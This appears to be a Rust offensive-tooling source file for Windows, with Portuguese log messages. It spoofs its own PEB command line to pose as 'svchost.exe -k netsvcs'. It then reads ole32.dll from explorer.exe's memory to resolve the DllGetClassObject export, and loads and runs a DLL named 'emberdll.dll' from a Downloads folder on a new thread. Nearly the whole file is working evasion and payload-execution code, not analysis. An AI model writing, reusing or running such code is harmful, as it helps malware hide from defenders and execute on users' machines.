#![allow(non_snake_case)]

use winapi::ctypes::c_void;
use std::mem::{size_of, zeroed};
use std::ffi::{CStr, OsStr, OsString};
use std::os::windows::ffi::{OsStrExt, OsStringExt};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::{OpenProcess, CreateThread};
use winapi::um::winnt::{
    PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    IMAGE_EXPORT_DIRECTORY,
};
use winapi::um::processenv::GetCommandLineW;
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use winapi::um::tlhelp32::*;
use winapi::shared::minwindef::LPVOID;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::errhandlingapi::GetLastError;


#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

type NtSetInformationProcessType = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    ProcessInformationClass: u32,
    ProcessInformation: *mut c_void,
    ProcessInformationLength: u32,
) -> u32;

#[cfg(target_arch = "x86_64")]
extern "C" {
    fn __readgsqword(offset: u32) -> usize;
}

extern "system" {
    fn NtReadVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        NumberOfBytesToRead: usize,
        NumberOfBytesReaded: *mut usize,
    ) -> i32;
}

fn get_pe_image_size(buffer: &[u8]) -> Option<usize> {
    unsafe {
        let dos_header = &*(buffer.as_ptr() as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D {
            return None;
        }

        let nt_header_offset = dos_header.e_lfanew as usize;
        let nt_headers = &*(buffer.as_ptr().add(nt_header_offset) as *const IMAGE_NT_HEADERS64);

        if nt_headers.Signature != 0x4550 {
            return None;
        }

        Some(nt_headers.OptionalHeader.SizeOfImage as usize)
    }
}

fn get_process_id_by_name(target_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry: PROCESSENTRY32 = zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) != 0 {
            loop {
                let exe_name = CStr::from_ptr(entry.szExeFile.as_ptr())
                    .to_string_lossy()
                    .to_string();

                if exe_name.to_lowercase().contains(&target_name.to_lowercase()) {
                    CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if Process32Next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        None
    }
}

fn get_module_base_address(pid: u32, module_name: &str) -> Option<LPVOID> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut me32: MODULEENTRY32 = zeroed();
        me32.dwSize = size_of::<MODULEENTRY32>() as u32;

        if Module32First(snapshot, &mut me32) != 0 {
            loop {
                let name = CStr::from_ptr(me32.szModule.as_ptr())
                    .to_string_lossy()
                    .to_string();

                if name.to_lowercase() == module_name.to_lowercase() {
                    CloseHandle(snapshot);
                    return Some(me32.modBaseAddr as LPVOID);
                }

                if Module32Next(snapshot, &mut me32) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        None
    }
}

fn dump_remote_memory(pid: u32, base: LPVOID, size: usize) -> Option<Vec<u8>> {
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
        if h_process.is_null() {
            return None;
        }

        let mut buffer: Vec<u8> = vec![0; size];
        let mut bytes_read: usize = 0;

        let status = NtReadVirtualMemory(
            h_process as *mut c_void,
            base,
            buffer.as_mut_ptr() as *mut c_void,
            size,
            &mut bytes_read as *mut usize,
        );

        CloseHandle(h_process);

        if status == 0 {
            Some(buffer)
        } else {
            None
        }
    }
}

fn read_u32(buffer: &[u8], offset: usize) -> u32 {
    let bytes = &buffer[offset..offset + 4];
    u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
}

fn rva_to_offset(rva: usize, base_rva: usize) -> usize {
    rva - base_rva
}

fn resolve_export_address(buffer: &[u8], export_name: &str, remote_base: usize) -> Option<usize> {
    unsafe {
        let dos_header = &*(buffer.as_ptr() as *const IMAGE_DOS_HEADER);
        let nt_headers = &*(buffer.as_ptr().add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);

        let export_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
        let export_dir_offset = export_rva;

        if export_dir_offset + std::mem::size_of::<IMAGE_EXPORT_DIRECTORY>() > buffer.len() {
            println!("[-] Export Directory fora do buffer");
            return None;
        }

        let export_dir = &*(buffer.as_ptr().add(export_dir_offset) as *const IMAGE_EXPORT_DIRECTORY);

        let names_rva = export_dir.AddressOfNames as usize;
        let ordinals_rva = export_dir.AddressOfNameOrdinals as usize;
        let functions_rva = export_dir.AddressOfFunctions as usize;

        let number_of_names = export_dir.NumberOfNames as usize;

        for i in 0..number_of_names {
            let name_ptr = names_rva + i * 4;
            if name_ptr + 4 > buffer.len() {
                continue;
            }

            let name_rva = read_u32(buffer, name_ptr) as usize;
            if name_rva >= buffer.len() {
                continue;
            }

            let mut name_end = name_rva;
            while name_end < buffer.len() && buffer[name_end] != 0 {
                name_end += 1;
            }

            if name_end > buffer.len() {
                continue;
            }

            let name_bytes = &buffer[name_rva..name_end];
            if let Ok(name_str) = std::str::from_utf8(name_bytes) {
                //println!("[*] Exported name[{}]: {}", i, name_str); // 🪵 Log para depuração

                if name_str == export_name {
                    let ord_ptr = ordinals_rva + i * 2;
                    if ord_ptr + 2 > buffer.len() {
                        continue;
                    }

                    let ordinal_index = buffer[ordinals_rva + i * 2] as usize;

                    let func_ptr = functions_rva + ordinal_index * 4;
                    if func_ptr + 4 > buffer.len() {
                        continue;
                    }

                    let func_rva = read_u32(buffer, func_ptr) as usize;
                    return Some(remote_base + func_rva);
                }
            }
        }

        println!("[-] {} não encontrado na export table", export_name);
        None
    }
}


unsafe fn execute_ember_dll() {
    let dll_path = b"C:\\Users\\user\\Downloads\\emberdll.dll\0";

    let h_module = LoadLibraryA(dll_path.as_ptr() as *const i8);
    if h_module.is_null() {
        println!("[-] Falha ao carregar ember.dll. GetLastError: {}", GetLastError());
        return;
    }

    let func = GetProcAddress(h_module, b"DllGetClassObject\0".as_ptr() as *const i8);
    if func.is_null() {
        println!("[-] Falha ao localizar DllGetClassObject. GetLastError: {}", GetLastError());
        return;
    }

    println!("[+] Executando ember::DllGetClassObject...");
    let h_thread = CreateThread(
        std::ptr::null_mut(),
        0,
        Some(std::mem::transmute(func)),
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
    );

    if h_thread.is_null() {
        println!("[-] Falha ao criar thread. GetLastError: {}", GetLastError());
    } else {
        println!("[+] Thread criada com sucesso.");
        WaitForSingleObject(h_thread, INFINITE);
    }
}

#[cfg(target_arch = "x86_64")]
unsafe fn spoof_peb_command_line_dynamic(new_cmdline: &str) {
    use winapi::um::memoryapi::VirtualAlloc;
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

    #[repr(C)]
    struct UNICODE_STRING {
        Length: u16,
        MaximumLength: u16,
        Buffer: *mut u16,
    }

    #[repr(C)]
    struct RTL_USER_PROCESS_PARAMETERS {
        Reserved1: [u8; 16],
        Reserved2: [*mut u8; 10],
        ImagePathName: UNICODE_STRING,
        CommandLine: UNICODE_STRING,
    }

    #[repr(C)]
    struct PEB {
        Reserved1: [u8; 2],
        BeingDebugged: u8,
        Reserved2: [u8; 1],
        Reserved3: [*mut c_void; 2],
        Ldr: *mut c_void,
        ProcessParameters: *mut RTL_USER_PROCESS_PARAMETERS,
    }

    extern "C" {
        fn __readgsqword(offset: u32) -> usize;
    }

    // Obter PEB
    let peb_ptr = __readgsqword(0x60) as *mut PEB;
    let process_parameters = (*peb_ptr).ProcessParameters;
    let cmd_line = &mut (*process_parameters).CommandLine;

    let wide: Vec<u16> = OsStr::new(new_cmdline).encode_wide().chain(Some(0)).collect();
    let size_bytes = wide.len() * 2;

    let new_buffer = VirtualAlloc(
        std::ptr::null_mut(),
        size_bytes,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut u16;

    if new_buffer.is_null() {
        println!("[-] Falha ao alocar memória para spoof.");
        return;
    }

    std::ptr::copy_nonoverlapping(wide.as_ptr(), new_buffer, wide.len());

    (*cmd_line).Buffer = new_buffer;
    (*cmd_line).Length = (wide.len() as u16 - 1) * 2;
    (*cmd_line).MaximumLength = (wide.len() as u16) * 2;

    println!("[+] Linha de comando spoofada dinamicamente com sucesso!");
}



fn main() {  
    unsafe {
        spoof_peb_command_line_dynamic("C:\\Windows\\System32\\svchost.exe -k netsvcs");
    }

    let target_process = "explorer.exe";
    let dll_name = "ole32.dll";

    if let Some(pid) = get_process_id_by_name(target_process) {
        println!("[+] Processo alvo encontrado: PID = {}", pid);

        if let Some(remote_base) = get_module_base_address(pid, dll_name) {
            println!("[+] Base da {} encontrada: {:?}", dll_name, remote_base);

            // Leitura temporária para extrair SizeOfImage
            if let Some(initial) = dump_remote_memory(pid, remote_base, 0x1000) {
                if let Some(size) = get_pe_image_size(&initial) {
                    println!("[+] Tamanho da DLL (SizeOfImage): {} bytes", size);

                    if let Some(buffer) = dump_remote_memory(pid, remote_base, size) {
                        println!("[+] Leitura completa da DLL realizada! Bytes: {}", buffer.len());

                        if let Some(addr) = resolve_export_address(&buffer, "DllGetClassObject", remote_base as usize) {
                            println!("[+] Endereço da função DllGetClassObject: 0x{:X}", addr);
                        } else {
                            println!("[-] DllGetClassObject não localizada.");
                        }
                    } else {
                        println!("[-] Falha ao ler a DLL completa.");
                    }
                } else {
                    println!("[-] Falha ao obter SizeOfImage.");
                }
            }
        }
    }

    unsafe { execute_ember_dll(); }
}
